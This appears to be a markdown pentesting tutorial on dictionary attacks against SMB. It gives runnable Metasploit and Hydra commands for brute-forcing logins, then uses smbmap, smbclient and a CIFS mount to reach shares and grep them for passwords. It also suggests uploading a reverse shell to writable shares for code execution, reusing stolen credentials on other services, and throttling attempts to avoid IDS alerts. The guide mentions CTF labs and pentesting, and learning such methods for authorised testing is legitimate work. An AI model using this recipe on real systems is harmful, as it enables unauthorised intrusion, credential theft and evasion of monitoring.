

# 🔐 SMB Dictionary Attack

When a null session or valid credentials are **not available**, dictionary/brute-force attacks can help discover valid usernames and passwords.

---

## 📍 Step 1: Get Target IP

Use tools like `netdiscover`, `nmap`, or monitor DHCP logs to find the target machine's IP.

---

## 🔎 Step 2: Dictionary Attack with Metasploit

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
show options

set RHOSTS <IP>
set SMBUser admin
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt

run
exit
```

* **`RHOSTS`**: Target IP address
* **`SMBUser`**: Username to brute-force
* **`PASS_FILE`**: Path to password wordlist

---

## 🔑 Step 3: Dictionary Attack Using Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>
```

* **`-l admin`**: Specify username
* **`-P`**: Password wordlist
* **`smb://<IP>`**: Target SMB service

---

## 📂 Step 4: Accessing Shares with Found Credentials

Once valid credentials are discovered, use `smbmap` to enumerate accessible shares:

```bash
smbmap -H <IP> -u admin -p <found_password>
```

* Lists accessible shares and permissions for the authenticated user.

---

### ✅ Tips:

* Always validate results manually after brute-force success.
* Use small, smart wordlists first before trying huge ones.
* Avoid too many requests in a short time to prevent account lockouts or IDS alerts.

---
After you **get valid SMB credentials** (like `admin:password123`):

---

## ✅ What to Do After Getting SMB Credentials

---
### 1. 🔍 **Enumerate SMB Shares with Credentials**

Use `smbmap` or `smbclient` to list and explore accessible shares.

#### 👉 Using `smbmap`:

```bash
smbmap -H <IP> -u admin -p password123
```

* This will show all accessible shares and their permissions (read/write).

---

### 2. 📁 **Access a Specific Share**

Once you identify a share (e.g., `ShareName`) with `READ` or `WRITE` access:

#### 👉 Using `smbclient`:

```bash
smbclient //IP/ShareName -U admin
```

* Enter password when prompted.
* You'll drop into an interactive shell similar to FTP:

  * `ls` — list files
  * `cd <dir>` — change directory
  * `get <file>` — download file
  * `put <file>` — upload file

---

### 3. 🛠️ **Mount SMB Share (Optional)**

If you want to mount the SMB share locally (to browse like a normal folder):

```bash
sudo mount -t cifs //IP/ShareName /mnt/smb -o username=admin,password=password123
```

> 📌 Create the mount point first: `sudo mkdir -p /mnt/smb`

---

### 4. 🔎 **Look for Sensitive Files or Scripts**

Search for:

* Passwords or creds in `.txt`, `.ini`, `.conf`, `.ps1` files
* `.bat` or `.vbs` scripts
* Database dumps
* `.bak` files
* Anything named “backup”, “creds”, “admin”, etc.

Use:

```bash
grep -i 'password' * 2>/dev/null
```

---

### 5. 🚪 **Check for Writable Share (Privilege Escalation or RCE)**

If a share is writable:

* Try uploading a reverse shell (e.g., `.exe`, `.ps1`, `.php`) depending on the target OS and services.
* Monitor if that file is executed automatically (cronjob, startup folder, etc.).

> 🔥 This may lead to **Remote Code Execution (RCE)** or **Privilege Escalation**.

---

### 6. 🧠 **Manual Enumeration & Next Steps**

If you’re in a CTF/lab:

* Look for `user.txt`, `root.txt`, or flags.
* Pivot to other services or users using harvested info.

If in real pentesting:

* Document every share, access type, and interesting files.
* Use credentials to log into other services (WinRM, RDP, FTP, Web apps).

---

### ⚙️ Bonus Tools:

* `enum4linux -u admin -p password123 <IP>`
* `crackmapexec smb <IP> -u admin -p password123`

